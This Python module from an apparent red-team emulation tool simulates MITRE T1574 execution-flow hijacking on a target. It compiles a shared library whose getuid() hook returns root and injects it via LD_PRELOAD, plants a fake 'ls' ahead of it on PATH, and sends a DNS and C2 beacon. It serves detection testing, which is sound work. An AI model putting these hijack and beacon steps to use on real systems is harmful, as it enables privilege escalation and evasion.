# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""
Attack: env_hijack — Privilege Escalation / Defense Evasion (TA0004 / TA0005)
T1574     Hijack Execution Flow
T1574.006 Hijack Execution Flow: LD_PRELOAD

SAFE simulation: compiles a minimal shared library in /tmp and demonstrates
the LD_PRELOAD injection technique. The fake library only prints a marker
message — no real hooking of system calls or privilege escalation.
Cleanup removes all artefacts immediately.
"""

from __future__ import annotations

from typing import Any

from gloamfire.attacks.base import AttackResult, BaseAttack
from gloamfire.core.registry import register

_DNS_BEACON_DOMAIN = "hijack-sim.gloamfire.invalid"
_FAKE_LIB_SRC = "/tmp/gloamfire_hook_sim.c"
_FAKE_LIB_SO = "/tmp/gloamfire_hook_sim.so"


@register
class EnvHijackAttack(BaseAttack):
    name = "env_hijack"
    description = (
        "Simulate LD_PRELOAD execution flow hijacking — compile and inject fake shared lib "
        "(T1574, T1574.006)"
    )
    mitre = ["T1574", "T1574.006"]

    def execute(self, target: str, params: dict[str, Any]) -> AttackResult:
        resolver = params.get("resolver", "8.8.8.8")

        script = f"""
echo "[Gloamfire] LD_PRELOAD hijack simulation starting"

# T1574.006 — write a minimal shared library that hooks getuid()
cat > {_FAKE_LIB_SRC} << 'EOF'
#include <stdio.h>
uid_t getuid(void) {{
    fprintf(stderr, "[Gloamfire-hook] getuid() intercepted via LD_PRELOAD (T1574.006)\\n");
    return 0;
}}
EOF

# Compile if gcc is available (gracefully skip if not)
if command -v gcc >/dev/null 2>&1; then
    gcc -shared -fPIC -o {_FAKE_LIB_SO} {_FAKE_LIB_SRC} -nostartfiles 2>/dev/null
    echo "[Gloamfire] Fake hook library compiled: {_FAKE_LIB_SO}"

    # Inject via LD_PRELOAD — runs 'id' with the hooked getuid
    echo "[Gloamfire] Injecting via LD_PRELOAD:"
    LD_PRELOAD={_FAKE_LIB_SO} id 2>&1 || true
else
    echo "[Gloamfire] gcc not available — demonstrating LD_PRELOAD concept only"
    echo "[Gloamfire] Real attack: LD_PRELOAD=/tmp/evil.so <binary>"
fi

# Demonstrate PATH hijacking (T1574.007 — no compilation needed)
echo "[Gloamfire] PATH hijack demo: prepend /tmp to PATH"
mkdir -p /tmp/gloamfire_path_hijack
echo '#!/bin/sh' > /tmp/gloamfire_path_hijack/ls
echo 'echo "[Gloamfire-hook] ls intercepted (T1574) — SIMULATION ONLY"' >> /tmp/gloamfire_path_hijack/ls
chmod +x /tmp/gloamfire_path_hijack/ls
PATH=/tmp/gloamfire_path_hijack:$PATH ls 2>/dev/null || true

echo "[Gloamfire] LD_PRELOAD hijack simulation complete"
"""
        result = self._exec(target, script)

        self._exec(target, f"nslookup {_DNS_BEACON_DOMAIN} {resolver} 2>/dev/null || true")
        self._c2_beacon(target)
        self._write_attack_log(target, self.name)
        return result


@register
class EnvHijackCleanup(BaseAttack):
    name = "env_hijack_cleanup"
    description = "Remove LD_PRELOAD simulation artefacts"
    mitre = []

    def execute(self, target: str, params: dict[str, Any]) -> AttackResult:
        return self._exec(
            target,
            f"rm -f {_FAKE_LIB_SRC} {_FAKE_LIB_SO} && rm -rf /tmp/gloamfire_path_hijack",
        )
